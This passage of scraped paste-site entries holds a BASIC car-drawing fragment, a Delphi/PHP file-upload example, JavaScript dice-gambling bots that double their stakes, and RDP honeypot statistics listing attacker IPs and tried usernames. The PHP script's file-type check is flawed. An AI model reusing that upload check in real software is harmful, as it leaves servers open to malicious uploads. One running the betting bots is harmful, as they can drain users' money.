 5580         IF WX% = -12345 GOTO 5650                 : REM IF WX IS END MARKER.
 5590           WX% = ABS(WX%)                          : REM IF WX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 5600           WY% = ABS(WY%)                          : REM IF WX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 5610           MOVE DX% + (WX% * SCX), DY% + (WY% * SCY) : REM **** MOVE WHEELS ****
 5620           GOTO 5650
 5630     REM ELSE
 5640           PLOT 145,WX%*SCX,0 : REM **** DRAW WHEELS ****
 5650     REM ENDIF
 5660 UNTIL WX% = -12345 AND WY% = -12345               : REM LOOP UNTIL WHEELS END MARKERS ARE READ.
 5670 :
 5680 ENDPROC                                           : REM END DRAW WHEELS PROCESS.
 6000 :
 6010 DATA -5,-11,7,14,1,21,18,27,11,30,11,26,-18,-27,43,33
 6020 DATA 55,35,-49,-34,60,32,-55,-35,60,33,-55,-35,53,26,53,22
 6030 DATA 54,16,55,11,49,11,47,19,43,22,39,24,36,24,35,24
 6040 DATA 30,22,27,19,23,11,5,11,-15,-21,19,21,19,23,15,23
 6050 DATA 15,21,-3,-19,25,19,-55,-11,97,11,99,15,100,19,101,24
 6060 DATA 101,29,100,33,60,33,86,44,85,46,54,35,-47,-19,52,19
 6070 DATA 100,19,-74,-28,111,22,112,24,112,27,111,30,74,28,-75,-33
 6080 DATA 83,41,-101,-33,136,33,113,45,104,47,101,33,-104,-47,125,37
 6090 DATA 124,33,-122,-33,123,38,-119,-33,120,37,-117,-33,118,36,-115,-33
 6100 DATA 116,37,-111,-33,114,39,-109,-33,111,40,-107,-33,109,41,-105,-33
 6110 DATA 107,42,-103,-33,105,43,-136,-33,159,35,113,45,-159,-35,162,37
 6120 DATA 162,24,160,21,157,16,146,12,142,19,158,19,-157,-22,157,24
 6130 DATA 153,24,153,22,157,22,-142,-19,138,23,134,24,131,24,128,24
 6140 DATA 123,23,119,21,117,19,114,11,49,11,-117,-19,100,19,-110,-17
 6150 DATA 103,17,102,15,110,15,110,17,-95,-33,96,35,97,36,98,36
 6160 DATA 99,35,100,33
 6200 DATA -12345,-12345 : REM END DRAW CAR MARKERS.
 6300 DATA -37,-15,9,9,-37,-15,7,7,-37,-15,2,2
 6310 DATA -130,-15,9,9,-130,-15,7,7,-130,-15,2,2
 6500 DATA -12345,-12345 : REM END DRAW WHEELS MARKERS."
RKHRSn9A,Untitled,svxvcer,Delphi,Saturday 20th of January 2024 07:57:48 PM CDT,"DELPHI=============================================================================================================
procedure TForm1.PostButClick(Sender: TObject);
var dataPost:TIdMultiPartFormDataStream;

begin
   dataPost:=TIdMultiPartFormDataStream.Create;


   dataPost.AddFormField('title',title.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('content',content.Text,'utf-8').ContentTransfer := '8bit';

   dataPost.AddFile('file',imgfile.Text,''); //добавляем поле с файлом


    response.Text:= StringReplace(idHTTP1.Post('http://ddddd.ru/get/get.php',dataPost),'<br>',#13#10,[rfReplaceAll]);

    datapost.Free;
end;

PHP=============================================================================================================
<?php
//Задаем заголовок ответа
header(""Content-Type: text/html; charset=utf-8"");

//Проверяем в поступивших данных наличие данных поля ""title""
if (!empty($_POST['title'])){
    echo 'Заголовок: '.$_POST['title'].'<br>';
} else {
    echo 'Заголовок: Отсутствует'.'<br>';
}

//Проверяем в поступивших данных наличие данных поля ""content""
if (!empty($_POST['content'])){
    echo 'Содержимое: '.$_POST['content'].'<br>';
} else {
    echo 'Содержимое: Отсутствует'.'<br>';
}

//Проверяем в поступивших данных наличие прикрепленного файла ""file""
if (!empty($_FILES['file'])) {
  
 $finfo = pathinfo($_FILES['file']['name']); //получаем инфо о файле (имя, расширение и т.д.)
  
  //Проверяем тип файла в списке допустимых типов( ИМПРОВИЗАЦИЯ :) )
  if (stripos('jpgpnggif',$finfo['extension'])==0){
   echo '>>>>>>>Недопустимый тип файла<<<<<<<<';
   exit;  //Если не допустим тип, полностью останавливаем скрипт
  }
   
    
   $fname = 'get/' . 'testimgfile.' . $finfo['extension']; //формируем путь и новое имя файла
   move_uploaded_file($_FILES['file']['tmp_name'],$fname);//сохраняем временный файл 'tmp_name' в файл $fname
   echo 'https://'.$_SERVER['HTTP_HOST'].'/'.$fname; //возвращаем полный путь к файлу
   
} 
  
?>




"
VZ1LNBMZ,#1 snowybot 2000,coinwalk,JavaScript,Saturday 20th of January 2024 06:53:24 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/800).toFixed(8));
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*5.9);
var eights = (base*6.9);
var muck = 4;
var upper = 6.9;
var downer = 2.9;
var bob = oldestbal;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.clear();
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
    bob = parseFloat(bellance);
}
if (bellance<(fart-(botplus*downer))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if ((bellance<=(bob-(base*7)))&&(bellance!=fart)){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if ((bellance>=(bob+(base*40)))&&(bellance!=fart)){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (((bellance-(botplus*2))<=0)&&(bellance!=fart)){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (bellance>=(oldestbal*24)) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => get(), 10);
}
get();"
k5arjWi9,snowybot,coinwalk,JavaScript,Saturday 20th of January 2024 06:35:31 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/800).toFixed(8));
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*5.9);
var eights = (base*6.9);
var muck = 4;
var upper = 6.9;
var downer = 2.9;
var bob = oldestbal;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.clear();
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if (bellance<(fart-(botplus*downer))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if (((bellance-(botplus*2))<=(bob-(base*8)))&&(bellance!=fart)){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (((bellance-(botplus*2))<=0)&&(bellance!=fart)){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if ((botplus>=(base*8))&&(bellance!=fart)){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (bellance>=(oldestbal*24)) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => get(), 10);
}
get();"
veS473q1,2024-01-20_stats.json,rdp_snitch,JSON,Saturday 20th of January 2024 06:18:11 PM CDT,"{
  ""ip"": {
    ""43.243.136.202"": 3,
    ""175.4.26.179"": 6,
    ""117.145.27.42"": 3,
    ""222.219.129.74"": 3,
    ""150.223.35.239"": 3,
    ""124.67.115.210"": 3,
    ""150.223.13.195"": 3,
    ""194.165.17.21"": 33,
    ""198.74.56.135"": 3,
    ""193.142.146.227"": 9,
    ""106.246.227.18"": 6,
    ""43.134.171.213"": 6,
    ""43.156.60.84"": 165,
    ""205.210.31.51"": 9,
    ""43.128.12.208"": 3,
    ""194.165.16.11"": 12,
    ""139.59.185.252"": 3,
    ""62.204.41.195"": 12,
    ""109.69.7.157"": 6,
    ""45.227.254.55"": 6,
    ""74.235.253.153"": 3,
    ""216.73.160.149"": 3,
    ""87.251.75.145"": 9,
    ""115.63.87.145"": 9,
    ""45.130.83.48"": 3,
    ""185.196.220.41"": 9,
    ""106.116.169.71"": 3,
    ""198.235.24.223"": 9,
    ""45.130.83.242"": 3,
    ""167.94.138.35"": 3,
    ""87.251.75.120"": 6,
    ""5.62.63.203"": 3,
    ""14.155.185.75"": 3,
    ""147.78.47.69"": 24,
    ""63.135.161.161"": 3,
    ""202.83.18.93"": 3,
    ""103.184.47.83"": 3,
    ""45.227.254.26"": 6,
    ""58.218.204.183"": 9,
    ""152.32.197.166"": 3,
    ""205.210.31.133"": 9,
    ""138.68.232.124"": 12,
    ""185.170.144.3"": 3,
    ""123.56.20.194"": 3,
    ""172.104.11.142"": 3,
    ""45.87.212.182"": 9,
    ""167.94.145.54"": 3,
    ""80.15.71.53"": 3,
    ""87.251.75.179"": 6,
    ""205.210.31.234"": 9,
    ""85.198.9.63"": 6
  },
  ""asn"": {
    ""AS4808"": 3,
    ""AS63838"": 6,
    ""AS9808"": 3,
    ""AS4134"": 18,
    ""AS58519"": 6,
    ""AS4837"": 12,
    ""AS48721"": 45,
    ""AS63949"": 6,
    ""AS208046"": 18,
    ""AS3786"": 6,
    ""AS132203"": 174,
    ""AS396982"": 36,
    ""AS14061"": 15,
    ""AS59425"": 12,
    ""AS21183"": 6,
    ""AS267784"": 12,
    ""AS8075"": 3,
    ""AS206092"": 12,
    ""AS208091"": 21,
    ""AS398324"": 3,
    ""AS198605"": 3,
    ""AS209588"": 24,
    ""AS24309"": 3,
    ""AS146817"": 3,
    ""AS135377"": 3,
    ""AS197414"": 3,
    ""AS37963"": 3,
    ""AS9009"": 9,
    ""AS398705"": 3,
    ""AS3215"": 3,
    ""AS60077"": 6
  },
  ""isp"": {
    ""China Unicom Beijing Province Network"": 3,
    ""Hengyang"": 6,
    ""China Mobile communications corporation"": 3,
    ""Chinanet"": 18,
    ""Cloud Computing Corporation"": 6,
    ""CNC Group CHINA169 Neimeng Province Network"": 3,
    ""Flyservers S.A."": 81,
    ""Akamai Technologies, Inc."": 3,
    ""ColocationX Ltd."": 18,
    ""LG DACOM Corporation"": 6,
    ""Aceville Pte.ltd"": 9,
    ""Shenzhen Tencent Computer Systems Company Limited"": 165,
    ""Google LLC"": 36,
    ""DIGITALOCEAN"": 3,
    ""Horizon LLC"": 12,
    ""Vodafone Network"": 6,
    ""Microsoft Corporation"": 3,
    ""Ipxo Limited"": 9,
    ""Xhost Internet Solutions LP"": 24,
    ""CNC Group CHINA169 Henan Province Network"": 9,
    ""Censys, Inc."": 6,
    ""AVAST Software s.r.o."": 3,
    ""Rockion LLC"": 3,
    ""Atria Convergence Technologies Pvt Ltd"": 3,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""DigitalOcean, LLC"": 12,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Akamai Technologies"": 3,
    ""M247 Europe SRL"": 9,
    ""France Telecom Orange"": 3,
    ""Asre Dadeha Asiatech"": 6
  },
  ""org"": {
    ""Beijing yunchuang communication Technology Co."": 3,
    ""Chinanet HN"": 6,
    ""China Mobile"": 3,
    ""Chinanet YN"": 3,
    ""Chinanet SD"": 6,
    ""Unknown"": 30,
    ""Flyservers S.A"": 69,
    ""Linode"": 6,
    ""ColocationX Ltd"": 9,
    ""Boranet"": 6,
    ""Tencent Cloud Computing"": 165,
    ""Palo Alto Networks, Inc"": 36,
    ""DigitalOcean, LLC"": 15,
    ""Horizon LLC"": 12,
    ""UAB Host Baltic"": 12,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Bandito Networks"": 3,
    ""Xhost Internet Solutions"": 21,
    ""VPN Consumer New York City, United States of America"": 6,
    ""Makut Investments"": 9,
    ""Chinanet HE"": 3,
    ""Censys, Inc"": 3,
    ""AVAST Software s.r.o."": 3,
    ""Chinanet GD"": 3,
    ""Ipxo LLC"": 3,
    ""BroadBand"": 3,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Chinanet JS"": 9,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Xhostis"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""M247 LTD"": 9,
    ""Censys, Inc."": 3,
    ""Asiatech Data Transmission company"": 6
  },
  ""regionName"": {
    ""Beijing"": 6,
    ""Hunan"": 6,
    ""Guangdong"": 6,
    ""Yunnan"": 3,
    ""Shandong"": 6,
    ""Fujian"": 3,
    ""Kaunas"": 45,
    ""New Jersey"": 6,
    ""North Holland"": 57,
    ""Gyeonggi-do"": 6,
    ""North West"": 171,
    ""California"": 48,
    ""Central and Western District"": 3,
    ""England"": 3,
    ""Moscow"": 12,
    ""Tirana"": 6,
    ""Vilnius"": 12,
    ""Virginia"": 12,
    ""New York"": 12,
    ""Henan"": 9,
    ""Hebei"": 3,
    ""Michigan"": 3,
    ""Ho Chi Minh"": 3,
    ""Karnataka"": 3,
    ""Hubei"": 3,
    ""Jiangsu"": 9,
    ""Sao Paulo"": 3,
    ""Hesse"": 12,
    ""Normandy"": 3,
    ""Tehran"": 6
  },
  ""country"": {
    ""China"": 54,
    ""Lithuania"": 57,
    ""United States"": 81,
    ""The Netherlands"": 57,
    ""South Korea"": 6,
    ""Singapore"": 171,
    ""Hong Kong"": 3,
    ""United Kingdom"": 3,
    ""Russia"": 12,
    ""Albania"": 6,
    ""Vietnam"": 3,
    ""India"": 3,
    ""Brazil"": 3,
    ""Germany"": 12,
    ""France"": 3,
    ""Iran"": 6
  },
  ""account"": {
    ""142.93.8.59"": 63,
    ""(empty)"": 27,
    ""Domain"": 24,
    ""Test"": 51,
    ""hello"": 39,
    ""Administrator"": 171,
    ""GMZdnHUAV"": 3,
    ""jFDzIc"": 3,
    ""okoogi"": 3,
    ""Datnguyentv"": 3,
    ""Administr"": 48,
    ""KJJyHcopM"": 3,
    ""qoGWFR"": 3,
    ""cjkpjA"": 3,
    ""QQgtmfZBl"": 3,
    ""UVxZzS"": 3,
    ""gYXOmL"": 3,
    ""cfz64rrn"": 12,
    ""beio"": 3,
    ""admin"": 3,
    ""tcqLypxWg"": 3,
    ""iAKkPr"": 3,
    ""kdKtrl"": 3
  },
  ""keyboard"": {
    ""Unknown"": 480
  },
  ""client_build"": {
    ""Unknown"": 480
  },
  ""client_name"": {
    ""Unknown"": 480
  },
  ""ip_type"": {
    ""Unknown"": 192,
    ""mobile"": 12,
    ""hosting"": 222,
    ""proxy"": 12,
    ""hosting & proxy"": 33,
    ""mobile & proxy"": 9
  }
}"
sqtu5Zez,2024-01-20_stats.json,rdp_snitch,JSON,Saturday 20th of January 2024 06:16:09 PM CDT,"{
  ""ip"": {
    ""43.243.136.202"": 2,
    ""175.4.26.179"": 4,
    ""117.145.27.42"": 2,
    ""222.219.129.74"": 2,
    ""150.223.35.239"": 2,
    ""124.67.115.210"": 2,
    ""150.223.13.195"": 2,
    ""194.165.17.21"": 22,
    ""198.74.56.135"": 2,
    ""193.142.146.227"": 6,
    ""106.246.227.18"": 4,
    ""43.134.171.213"": 4,
    ""43.156.60.84"": 110,
    ""205.210.31.51"": 6,
    ""43.128.12.208"": 2,
    ""194.165.16.11"": 8,
    ""139.59.185.252"": 2,
    ""62.204.41.195"": 8,
    ""109.69.7.157"": 4,
    ""45.227.254.55"": 4,
    ""74.235.253.153"": 2,
    ""216.73.160.149"": 2,
    ""87.251.75.145"": 6,
    ""115.63.87.145"": 6,
    ""45.130.83.48"": 2,
    ""185.196.220.41"": 6,
    ""106.116.169.71"": 2,
    ""198.235.24.223"": 6,
    ""45.130.83.242"": 2,
    ""167.94.138.35"": 2,
    ""87.251.75.120"": 4,
    ""5.62.63.203"": 2,
    ""14.155.185.75"": 2,
    ""147.78.47.69"": 16,
    ""63.135.161.161"": 2,
    ""202.83.18.93"": 2,
    ""103.184.47.83"": 2,
    ""45.227.254.26"": 4,
    ""58.218.204.183"": 6,
    ""152.32.197.166"": 2,
    ""205.210.31.133"": 6,
    ""138.68.232.124"": 8,
    ""185.170.144.3"": 2,
    ""123.56.20.194"": 2,
    ""172.104.11.142"": 2,
    ""45.87.212.182"": 6,
    ""167.94.145.54"": 2,
    ""80.15.71.53"": 2,
    ""87.251.75.179"": 4,
    ""205.210.31.234"": 6,
    ""85.198.9.63"": 4
  },
  ""asn"": {
    ""AS4808"": 2,
    ""AS63838"": 4,
    ""AS9808"": 2,
    ""AS4134"": 12,
    ""AS58519"": 4,
    ""AS4837"": 8,
    ""AS48721"": 30,
    ""AS63949"": 4,
    ""AS208046"": 12,
    ""AS3786"": 4,
    ""AS132203"": 116,
    ""AS396982"": 24,
    ""AS14061"": 10,
    ""AS59425"": 8,
    ""AS21183"": 4,
    ""AS267784"": 8,
    ""AS8075"": 2,
    ""AS206092"": 8,
    ""AS208091"": 14,
    ""AS398324"": 2,
    ""AS198605"": 2,
    ""AS209588"": 16,
    ""AS24309"": 2,
    ""AS146817"": 2,
    ""AS135377"": 2,
    ""AS197414"": 2,
    ""AS37963"": 2,
    ""AS9009"": 6,
    ""AS398705"": 2,
    ""AS3215"": 2,
    ""AS60077"": 4
  },
  ""isp"": {
    ""China Unicom Beijing Province Network"": 2,
    ""Hengyang"": 4,
    ""China Mobile communications corporation"": 2,
    ""Chinanet"": 12,
    ""Cloud Computing Corporation"": 4,
    ""CNC Group CHINA169 Neimeng Province Network"": 2,
    ""Flyservers S.A."": 54,
    ""Akamai Technologies, Inc."": 2,
    ""ColocationX Ltd."": 12,
    ""LG DACOM Corporation"": 4,
    ""Aceville Pte.ltd"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 110,
    ""Google LLC"": 24,
    ""DIGITALOCEAN"": 2,
    ""Horizon LLC"": 8,
    ""Vodafone Network"": 4,
    ""Microsoft Corporation"": 2,
    ""Ipxo Limited"": 6,
    ""Xhost Internet Solutions LP"": 16,
    ""CNC Group CHINA169 Henan Province Network"": 6,
    ""Censys, Inc."": 4,
    ""AVAST Software s.r.o."": 2,
    ""Rockion LLC"": 2,
    ""Atria Convergence Technologies Pvt Ltd"": 2,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Akamai Technologies"": 2,
    ""M247 Europe SRL"": 6,
    ""France Telecom Orange"": 2,
    ""Asre Dadeha Asiatech"": 4
  },
  ""org"": {
    ""Beijing yunchuang communication Technology Co."": 2,
    ""Chinanet HN"": 4,
    ""China Mobile"": 2,
    ""Chinanet YN"": 2,
    ""Chinanet SD"": 4,
    ""Unknown"": 20,
    ""Flyservers S.A"": 46,
    ""Linode"": 4,
    ""ColocationX Ltd"": 6,
    ""Boranet"": 4,
    ""Tencent Cloud Computing"": 110,
    ""Palo Alto Networks, Inc"": 24,
    ""DigitalOcean, LLC"": 10,
    ""Horizon LLC"": 8,
    ""UAB Host Baltic"": 8,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Bandito Networks"": 2,
    ""Xhost Internet Solutions"": 14,
    ""VPN Consumer New York City, United States of America"": 4,
    ""Makut Investments"": 6,
    ""Chinanet HE"": 2,
    ""Censys, Inc"": 2,
    ""AVAST Software s.r.o."": 2,
    ""Chinanet GD"": 2,
    ""Ipxo LLC"": 2,
    ""BroadBand"": 2,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Chinanet JS"": 6,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Xhostis"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""M247 LTD"": 6,
    ""Censys, Inc."": 2,
    ""Asiatech Data Transmission company"": 4
  },
  ""regionName"": {
    ""Beijing"": 4,
    ""Hunan"": 4,
    ""Guangdong"": 4,
    ""Yunnan"": 2,
    ""Shandong"": 4,
    ""Fujian"": 2,
    ""Kaunas"": 30,
    ""New Jersey"": 4,
    ""North Holland"": 38,
    ""Gyeonggi-do"": 4,
    ""North West"": 114,
    ""California"": 32,
    ""Central and Western District"": 2,
    ""England"": 2,
    ""Moscow"": 8,
    ""Tirana"": 4,
    ""Vilnius"": 8,
    ""Virginia"": 8,
    ""New York"": 8,
    ""Henan"": 6,
    ""Hebei"": 2,
    ""Michigan"": 2,
    ""Ho Chi Minh"": 2,
    ""Karnataka"": 2,
    ""Hubei"": 2,
    ""Jiangsu"": 6,
    ""Sao Paulo"": 2,
    ""Hesse"": 8,
    ""Normandy"": 2,
    ""Tehran"": 4
  },
  ""country"": {
    ""China"": 36,
    ""Lithuania"": 38,
    ""United States"": 54,
    ""The Netherlands"": 38,
    ""South Korea"": 4,
    ""Singapore"": 114,
    ""Hong Kong"": 2,
    ""United Kingdom"": 2,
    ""Russia"": 8,
    ""Albania"": 4,
    ""Vietnam"": 2,
    ""India"": 2,
    ""Brazil"": 2,
    ""Germany"": 8,
    ""France"": 2,
    ""Iran"": 4
  },
  ""account"": {
    ""142.93.8.59"": 42,
    ""(empty)"": 18,
    ""Domain"": 16,
    ""Test"": 34,
    ""hello"": 26,
    ""Administrator"": 114,
    ""GMZdnHUAV"": 2,
    ""jFDzIc"": 2,
    ""okoogi"": 2,
    ""Datnguyentv"": 2,
    ""Administr"": 32,
    ""KJJyHcopM"": 2,
    ""qoGWFR"": 2,
    ""cjkpjA"": 2,
    ""QQgtmfZBl"": 2,
    ""UVxZzS"": 2,
    ""gYXOmL"": 2,
    ""cfz64rrn"": 8,
    ""beio"": 2,
    ""admin"": 2,
    ""tcqLypxWg"": 2,
    ""iAKkPr"": 2,
    ""kdKtrl"": 2
  },
  ""keyboard"": {
    ""Unknown"": 320
  },
  ""client_build"": {
    ""Unknown"": 320
  },
  ""client_name"": {
    ""Unknown"": 320
  },
  ""ip_type"": {
    ""Unknown"": 128,
    ""mobile"": 8,
    ""hosting"": 148,
    ""proxy"": 8,
    ""hosting & proxy"": 22,
    ""mobile & proxy"": 6
  }
}"
RWTgNptC,2024-01-20_stats.json,rdp_snitch,JSON,Saturday 20th of January 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""43.243.136.202"": 1,
    ""175.4.26.179"": 2,
    ""117.145.27.42"": 1,
    ""222.219.129.74"": 1,
    ""150.223.35.239"": 1,
    ""124.67.115.210"": 1,
    ""150.223.13.195"": 1,
    ""194.165.17.21"": 11,
    ""198.74.56.135"": 1,
    ""193.142.146.227"": 3,
    ""106.246.227.18"": 2,
    ""43.134.171.213"": 2,
    ""43.156.60.84"": 55,
    ""205.210.31.51"": 3,
    ""43.128.12.208"": 1,
    ""194.165.16.11"": 4,
    ""139.59.185.252"": 1,
    ""62.204.41.195"": 4,
    ""109.69.7.157"": 2,
    ""45.227.254.55"": 2,
    ""74.235.253.153"": 1,
    ""216.73.160.149"": 1,
    ""87.251.75.145"": 3,
    ""115.63.87.145"": 3,
    ""45.130.83.48"": 1,
    ""185.196.220.41"": 3,
    ""106.116.169.71"": 1,
    ""198.235.24.223"": 3,
    ""45.130.83.242"": 1,
    ""167.94.138.35"": 1,
    ""87.251.75.120"": 2,
    ""5.62.63.203"": 1,
    ""14.155.185.75"": 1,
    ""147.78.47.69"": 8,
    ""63.135.161.161"": 1,
    ""202.83.18.93"": 1,
    ""103.184.47.83"": 1,
    ""45.227.254.26"": 2,
    ""58.218.204.183"": 3,
    ""152.32.197.166"": 1,
    ""205.210.31.133"": 3,
    ""138.68.232.124"": 4,
    ""185.170.144.3"": 1,
    ""123.56.20.194"": 1,
    ""172.104.11.142"": 1,
    ""45.87.212.182"": 3,
    ""167.94.145.54"": 1,
    ""80.15.71.53"": 1,
    ""87.251.75.179"": 2,
    ""205.210.31.234"": 3,
    ""85.198.9.63"": 2
  },
  ""asn"": {
    ""AS4808"": 1,
    ""AS63838"": 2,
    ""AS9808"": 1,
    ""AS4134"": 6,
    ""AS58519"": 2,
    ""AS4837"": 4,
    ""AS48721"": 15,
    ""AS63949"": 2,
    ""AS208046"": 6,
    ""AS3786"": 2,
    ""AS132203"": 58,
    ""AS396982"": 12,
    ""AS14061"": 5,
    ""AS59425"": 4,
    ""AS21183"": 2,
    ""AS267784"": 4,
    ""AS8075"": 1,
    ""AS206092"": 4,
    ""AS208091"": 7,
    ""AS398324"": 1,
    ""AS198605"": 1,
    ""AS209588"": 8,
    ""AS24309"": 1,
    ""AS146817"": 1,
    ""AS135377"": 1,
    ""AS197414"": 1,
    ""AS37963"": 1,
    ""AS9009"": 3,
    ""AS398705"": 1,
    ""AS3215"": 1,
    ""AS60077"": 2
  },
  ""isp"": {
    ""China Unicom Beijing Province Network"": 1,
    ""Hengyang"": 2,
    ""China Mobile communications corporation"": 1,
    ""Chinanet"": 6,
    ""Cloud Computing Corporation"": 2,
    ""CNC Group CHINA169 Neimeng Province Network"": 1,
    ""Flyservers S.A."": 27,
    ""Akamai Technologies, Inc."": 1,
    ""ColocationX Ltd."": 6,
    ""LG DACOM Corporation"": 2,
    ""Aceville Pte.ltd"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 55,
    ""Google LLC"": 12,
    ""DIGITALOCEAN"": 1,
    ""Horizon LLC"": 4,
    ""Vodafone Network"": 2,
    ""Microsoft Corporation"": 1,
    ""Ipxo Limited"": 3,
    ""Xhost Internet Solutions LP"": 8,
    ""CNC Group CHINA169 Henan Province Network"": 3,
    ""Censys, Inc."": 2,
    ""AVAST Software s.r.o."": 1,
    ""Rockion LLC"": 1,
    ""Atria Convergence Technologies Pvt Ltd"": 1,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Akamai Technologies"": 1,
    ""M247 Europe SRL"": 3,
    ""France Telecom Orange"": 1,
    ""Asre Dadeha Asiatech"": 2
  },
  ""org"": {
    ""Beijing yunchuang communication Technology Co."": 1,
    ""Chinanet HN"": 2,
    ""China Mobile"": 1,
    ""Chinanet YN"": 1,
    ""Chinanet SD"": 2,
    ""Unknown"": 10,
    ""Flyservers S.A"": 23,
    ""Linode"": 2,
    ""ColocationX Ltd"": 3,
    ""Boranet"": 2,
    ""Tencent Cloud Computing"": 55,
    ""Palo Alto Networks, Inc"": 12,
    ""DigitalOcean, LLC"": 5,
    ""Horizon LLC"": 4,
    ""UAB Host Baltic"": 4,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Bandito Networks"": 1,
    ""Xhost Internet Solutions"": 7,
    ""VPN Consumer New York City, United States of America"": 2,
    ""Makut Investments"": 3,
    ""Chinanet HE"": 1,
    ""Censys, Inc"": 1,
    ""AVAST Software s.r.o."": 1,
    ""Chinanet GD"": 1,
    ""Ipxo LLC"": 1,
    ""BroadBand"": 1,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Chinanet JS"": 3,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Xhostis"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""M247 LTD"": 3,
    ""Censys, Inc."": 1,
    ""Asiatech Data Transmission company"": 2
  },
  ""regionName"": {
    ""Beijing"": 2,
    ""Hunan"": 2,
    ""Guangdong"": 2,
    ""Yunnan"": 1,
    ""Shandong"": 2,
    ""Fujian"": 1,
    ""Kaunas"": 15,
    ""New Jersey"": 2,
    ""North Holland"": 19,
    ""Gyeonggi-do"": 2,
    ""North West"": 57,
    ""California"": 16,
    ""Central and Western District"": 1,
    ""England"": 1,
    ""Moscow"": 4,
    ""Tirana"": 2,
    ""Vilnius"": 4,
    ""Virginia"": 4,
    ""New York"": 4,
    ""Henan"": 3,
    ""Hebei"": 1,
    ""Michigan"": 1,
    ""Ho Chi Minh"": 1,
    ""Karnataka"": 1,
    ""Hubei"": 1,
    ""Jiangsu"": 3,
    ""Sao Paulo"": 1,
    ""Hesse"": 4,
    ""Normandy"": 1,
    ""Tehran"": 2
  },
  ""country"": {
    ""China"": 18,
    ""Lithuania"": 19,
    ""United States"": 27,
    ""The Netherlands"": 19,
    ""South Korea"": 2,
    ""Singapore"": 57,
    ""Hong Kong"": 1,
    ""United Kingdom"": 1,
    ""Russia"": 4,
    ""Albania"": 2,
    ""Vietnam"": 1,
    ""India"": 1,
    ""Brazil"": 1,
    ""Germany"": 4,
    ""France"": 1,
    ""Iran"": 2
  },
  ""account"": {
    ""142.93.8.59"": 21,
    ""(empty)"": 9,
    ""Domain"": 8,
    ""Test"": 17,
    ""hello"": 13,
    ""Administrator"": 57,
    ""GMZdnHUAV"": 1,
    ""jFDzIc"": 1,
    ""okoogi"": 1,
    ""Datnguyentv"": 1,
    ""Administr"": 16,
    ""KJJyHcopM"": 1,
    ""qoGWFR"": 1,
    ""cjkpjA"": 1,
    ""QQgtmfZBl"": 1,
    ""UVxZzS"": 1,
    ""gYXOmL"": 1,
    ""cfz64rrn"": 4,
    ""beio"": 1,
    ""admin"": 1,
